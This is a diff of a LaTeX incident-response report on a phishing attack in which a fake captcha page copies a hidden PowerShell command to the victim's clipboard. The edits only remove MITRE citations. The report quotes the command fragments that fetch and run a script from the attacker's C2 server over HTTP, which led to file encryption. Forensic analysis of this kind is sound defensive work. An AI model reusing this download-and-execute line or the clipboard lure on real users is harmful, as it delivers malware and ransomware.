@@ -32,8 +32,8 @@ Trying different encodings to display the file contents didn't yield legible res
 \end{figure}
 
 \subsubsection{Compromise Indicator Assessment}
-Assessing the victim's E-Mail inbox reveals a Phishing E-Mail (see \cref{fish_mail_c2}). The attackers used the \textit{Phishing: Spearphishing Link (T1566.002)} \autocite{mitre:attack:T1566:002} technique to target the victim.
-They posed as Microsoft Support by using an E-Mail made to look similar to a real support account (see \cref{fish_mail_mail}), leading the user to fall victim to the \textit{Social Engineering: Email Spoofing (T1684.002)} technique \autocite{mitre:attack:T1684:002}. The E-Mail contained a hyperlink, which contained the attacker's C2-Server's address and the port the server ran on: \textit{IP:192.168.61.26, Port: 8080} (see \cref{fish_mail_c2}). 
+Assessing the victim's E-Mail inbox reveals a Phishing E-Mail (see \cref{fish_mail_c2}). The attackers used the \textit{Phishing: Spearphishing Link (T1566.002)} technique to target the victim.
+They posed as Microsoft Support by using an E-Mail made to look similar to a real support account (see \cref{fish_mail_mail}), leading the user to fall victim to the \textit{Social Engineering: Email Spoofing (T1684.002)} technique. The E-Mail contained a hyperlink, which contained the attacker's C2-Server's address and the port the server ran on: \textit{IP:192.168.61.26, Port: 8080} (see \cref{fish_mail_c2}). 
 The attackers created fake urgency by claiming the user's account had been compromised.
 
 \begin{figure}[!htb]
@@ -73,7 +73,7 @@ Filtering for the timeframe the incident occurred in (see \cref{fish_filet}), as
 	\label{fish_reste}
 \end{figure}
 
-The command seemingly responsible for the incident seems to be a PowerShell process started in the background with the \enquote{hidden} flag \autocite{microsoft:pwshll_hid} (see \cref{fish_reste}, marked red) (\textit{\textbackslash Powershell.exe" -w hidden}), which downloads the file \textit{download.txt} from the previously discovered C2-server via HTTP \autocite{microsoft:iwr} (\textit{iwr 'http://192.168.61.26:8080/download.txt'}). This can be categorized as \textit{Ingress Tool Transfer (T1105)} \autocite{mitre:attack:T1105}. The command then executes the instructions contained in the downloaded file \autocite{microsoft:iex} (\textit{'iex (...).Content}).
+The command seemingly responsible for the incident seems to be a PowerShell process started in the background with the \enquote{hidden} flag \autocite{microsoft:pwshll_hid} (see \cref{fish_reste}, marked red) (\textit{\textbackslash Powershell.exe" -w hidden}), which downloads the file \textit{download.txt} from the previously discovered C2-server via HTTP \autocite{microsoft:iwr} (\textit{iwr 'http://192.168.61.26:8080/download.txt'}). This can be categorized as \textit{Ingress Tool Transfer (T1105)}. The command then executes the instructions contained in the downloaded file \autocite{microsoft:iex} (\textit{'iex (...).Content}).
 
 The computer the command ran on was called \textit{DESKTOP-FEA5EJA} (see \cref{fish_reste}, marked green).
 
@@ -194,9 +194,9 @@ The script can be viewed in the appended files:\\
 
 \newpage
 \subsubsection{Attack Validation}
-Clicking on the link in the Phishing E-Mail opened the attacker's website, prompting the user to supposedly authenticate themselves (see \cref{captchga}). The received source code was assessed in the browser's network tab before continuing to interact with the website. This revealed that the button's onClick-handler calls a function, which drops the \textit{PowerShell} command discussed in \fullref{siem_fish} into the user's clipboard and creates a pop-up with instructions to execute it (see \cref{clipboard}). This can be categorized as \textit{User Execution: Malicious Copy and Paste (T1204.004)} \autocite{mitre:attack:T1204:004}.
+Clicking on the link in the Phishing E-Mail opened the attacker's website, prompting the user to supposedly authenticate themselves (see \cref{captchga}). The received source code was assessed in the browser's network tab before continuing to interact with the website. This revealed that the button's onClick-handler calls a function, which drops the \textit{PowerShell} command discussed in \fullref{siem_fish} into the user's clipboard and creates a pop-up with instructions to execute it (see \cref{clipboard}). This can be categorized as \textit{User Execution: Malicious Copy and Paste (T1204.004)}.
 
-The victim must have clicked the link, then clicked the fake \textit{Captcha} button, and followed the instructions in the popup. This led to their system fetching the script from the C2 server resulting in the victim's files being encrypted, which can be classified as \textit{Data Encrypted for Impact (T1486)} \autocite{mitre:attack:T1486}.
+The victim must have clicked the link, then clicked the fake \textit{Captcha} button, and followed the instructions in the popup. This led to their system fetching the script from the C2 server resulting in the victim's files being encrypted, which can be classified as \textit{Data Encrypted for Impact (T1486)}.
 
 \begin{figure}[!htb]
 	\centering
